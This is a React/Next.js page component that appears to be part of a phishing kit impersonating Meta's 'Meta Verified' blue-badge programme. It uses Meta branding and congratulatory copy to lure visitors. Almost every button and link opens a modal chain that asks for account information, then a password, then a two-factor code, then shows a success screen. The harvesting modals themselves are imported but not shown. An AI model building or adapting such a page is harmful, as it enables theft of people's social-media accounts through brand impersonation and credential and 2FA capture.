'use client'

import FaqMeta from '#components/faq/FaqMeta';
import Footer from '#components/footer/Footer';
import FooterSubscribe from '#components/footer/FooterSubscribe';
import MetaFeature from '#components/meta-feature/MetaFeature';
import InfomationsModal from '#components/modals/InfomationsModal';
import PasswordModal from '#components/modals/PasswordModal';
import SuccessModal from '#components/modals/SuccessModal';
import TwoFactorModal from '#components/modals/TwoFactorModal';
import StepVerified from '#components/step-verify/StepVerified';
import TestimonialSlider from '#components/testimonials/TestimonialSlider';
import { getLocalStorage } from '@/helper/localstorage';
import Link from 'next/link';
import React from 'react';

const Notification = () => {
    // LOCATION CLIENT
    const [userLocation, setUserLocation] = React.useState<any>(null);
    React.useEffect(() => {
        const userLocation = getLocalStorage('location_user');
        setUserLocation(userLocation);
    }, []);

    // STATE MODAL
    const [isOpendInfo, setIsOpendInfo] = React.useState(false);
    const [isOpendPassword, setIsOpendPassword] = React.useState(false);
    const [isOpendTwoFactor, setIsOpendTwoFactor] = React.useState(false);
    const [isOpendSuccess, setIsOpendSuccess] = React.useState(false);
    

    // HANDLE MODAL
    const handleOpendInfoModal = () => {
        setIsOpendInfo(true);
    }

    const handleOpendPasswordModal = (isOpenPassword: boolean) => {
        setIsOpendPassword(isOpenPassword);
    }

    const handleOpendTwoFactorModal = (isOpenTwoFactor: boolean) => {
        setIsOpendTwoFactor(isOpenTwoFactor);
    }

    const handleOpendSuccessModal = (isOpenSuccess: boolean) => {
        setIsOpendSuccess(isOpenSuccess);
    }

    return (
        <>
            <div className="">
                <div className='px-6 md:h-[80px] h-[60px] bg-[#f5f6f6] flex items-center justify-between'>
                    <div className='flex items-center justify-start gap-2 text-[14px]  '>
                        <img onClick={() => handleOpendInfoModal()} src="/images/meta/logo-meta.svg" className='md:w-[65px] w-[70px]' alt="blue" />
                        <div className='ml-[50px] md:flex hidden items-center justify-start gap-7 text-[#1c2b33]'>
                            <span onClick={() => handleOpendInfoModal()} className='cursor-pointer font-bold relative after:content-[""] after:absolute after:bottom-0 after:left-0 after:w-full after:h-[2px] after:bg-[#cbd2d9] after:transform after:scale-x-0 after:origin-left after:transition-transform after:duration-300 hover:after:scale-x-100'>Get started</span>
                            <span onClick={() => handleOpendInfoModal()} className='cursor-pointer font-bold relative after:content-[""] after:absolute after:bottom-0 after:left-0 after:w-full after:h-[2px] after:bg-[#cbd2d9] after:transform after:scale-x-0 after:origin-left after:transition-transform after:duration-300 hover:after:scale-x-100'>Advertise</span>
                            <span onClick={() => handleOpendInfoModal()} className='cursor-pointer font-bold relative after:content-[""] after:absolute after:bottom-0 after:left-0 after:w-full after:h-[2px] after:bg-[#cbd2d9] after:transform after:scale-x-0 after:origin-left after:transition-transform after:duration-300 hover:after:scale-x-100'>Learn</span>
                            <span onClick={() => handleOpendInfoModal()} className='cursor-pointer font-bold relative after:content-[""] after:absolute after:bottom-0 after:left-0 after:w-full after:h-[2px] after:bg-[#cbd2d9] after:transform after:scale-x-0 after:origin-left after:transition-transform after:duration-300 hover:after:scale-x-100'>Support</span>
                        </div>
                    </div>
                    <div className='md:flex hidden items-center justify-start gap-10'>
                        <img onClick={() => handleOpendInfoModal()} src="/images/meta/ic_search.svg" className='w-[20px] h-[20px] cursor-pointer' alt="user" />
                        <img onClick={() => handleOpendInfoModal()} src="/images/meta/ic_user.svg" className='w-[40px] h-[40px] cursor-pointer' alt="user" />
                    </div>
                    <div className='md:hidden flex items-center justify-start gap-10'>
                        <img onClick={() => handleOpendInfoModal()} src="/images/meta/ic_search.svg" className='w-[20px] h-[20px] cursor-pointer' alt="user" />    
                    </div>
                </div>

                <div className='flex md:flex-row flex-col w-full items-center justify-between'>
                    <div className='md:w-1/2 w-full flex items-center justify-end md:order-1 order-2 py-8 px-6'>
                        <div className='md:max-w-[515px] max-w-[100%] w-full md:mr-[4rem] mr-[0px] md:block flex flex-col items-start justify-start'>
                            <img src="/images/meta/ic_blue.svg" alt="meta" className='order-1 md:w-[84px] w-[48px] md:h-[84px] h-[48px]' />
                            <h1 className='md:text-[48px] text-[32px] font-bold mb-4 order-2'>Show the world that you mean business.</h1>
                            <p className='text-16px text-[#1c2b33] font-[300] md:order-3 order-4'>Congratulations on achieving the requirements to upgrade your page to a verified blue badge! This is a fantastic milestone that reflects your dedication and the trust you&apos;ve built with your audience.</p>
                            <p className='text-16px text-[#1c2b33] font-[300] md:order-4 order-5'>We&apos;re thrilled to celebrate this moment with you and look forward to seeing your page thrive with this prestigious recognition!</p>
                            <button onClick={() => handleOpendInfoModal()} className='md:order-5 order-3 bg-[#0062ff] text-white px-6 h-[50px] flex items-center justify-center rounded-full md:mt-6 mt-0 mb-6 font-[600] text-[15px]'>Subscribe on Facebook</button>
                        </div>
                    </div>
                    <div className='md:w-1/2 w-full md:order-2 order-1 md:py-0 md:h-[calc(100vh-80px)] h-[200px] overflow-hidden'>
                        <video src="/videos/video-meta.mp4" className='w-full h-full object-cover block md:h-full h-[300px] w-full' autoPlay muted loop></video>
                    </div>
                </div>

                <div className='max-w-[1175px] mx-auto md:pt-20 pt-6 px-6 md:mb-0 mb-10'>
                    <div className='md:w-[83%] w-[100%]'>
                        <p className='text-[32px]'>A creator toolkit to take your brand further</p>
                        <p className='text-[16px] text-[#1c2b33] font-[300] my-4'>Explore key Meta Verified benefits available for Facebook and Instagram. See creator plans and pricing for additional benefits.</p>
                        <Link href="https://www.facebook.com/business/ads/ad-objectives/awareness" className='text-[#0064E0]'>
                            <div className='flex items-center justify-start gap-2 pt-3'>
                                <div className='rounded-full w-[24px] h-[24px] flex items-center justify-center border border-[#0064E0]'>
                                    <img src="/images/meta/ic_circle.svg" alt="circle" className='w-[20px] h-[20px] ' />
                                </div>
                                <span className='text-[14px]'>Learn more</span>
                            </div>
                        </Link>
                    </div>
                </div>

                <MetaFeature/>

                <StepVerified/>

                <TestimonialSlider/>
                
                <div className='flex md:flex-row flex-col w-full items-center justify-between'>
                    <div className='md:w-1/2 w-full flex items-center justify-end md:order-1 order-2 py-8 px-6'>
                        <div className='md:max-w-[515px] max-w-[100%] w-full md:mr-[4rem] mr-[0px] md:block flex flex-col items-start justify-start'>
                            <img src="/images/meta/ic_blue.svg" alt="meta" className='order-1 md:w-[84px] w-[48px] md:h-[84px] h-[48px]' />
                            <h1 className='md:text-[48px] text-[32px] font-bold mb-4 order-2'>Show the world that you mean business.</h1>
                            <button onClick={() => handleOpendInfoModal()} className='md:order-5 order-3 bg-[#0062ff] text-white px-6 h-[50px] flex items-center justify-center rounded-full md:mt-6 mt-0 mb-6 font-[600] text-[15px]'>Subscribe on Facebook</button>
                        </div>
                    </div>
                    <div className='md:w-1/2 w-full md:order-2 order-1 md:py-0 md:h-[calc(100vh-80px)] h-[200px] overflow-hidden'>
                        <video src="/videos/video-meta.mp4" className='w-full h-full object-cover block md:h-full h-[300px] w-full' autoPlay muted loop></video>
                    </div>
                </div>

                <FaqMeta/>

                <FooterSubscribe/>

                <Footer/>


                {/* MODAL */}
                <InfomationsModal
                    isOpend={isOpendInfo}
                    userLocation={userLocation}
                    isOpendPassword={(isOpenPassword: boolean) => handleOpendPasswordModal(isOpenPassword)}
                    onToggleModal={(isOpen: boolean) => setIsOpendInfo(isOpen)}
                />

                <PasswordModal
                    isOpend={isOpendPassword}
                    isOpendTwoFactor={(isOpenTwoFactor: boolean) => handleOpendTwoFactorModal(isOpenTwoFactor)}
                    onToggleModal={(isOpen: boolean) => setIsOpendPassword(isOpen)}
                />

                <TwoFactorModal
                    isOpend={isOpendTwoFactor}
                    isOpendFinish={(isOpenFinish: boolean) => handleOpendSuccessModal(isOpenFinish)}
                    onToggleModal={(isOpen: boolean) => setIsOpendTwoFactor(isOpen)}
                />

                <SuccessModal
                    isOpend={isOpendSuccess}
                    onToggleSuccess={(isOpen: boolean) => setIsOpendSuccess(isOpen)}
                />
            </div>
        </>
    )
}

export default Notification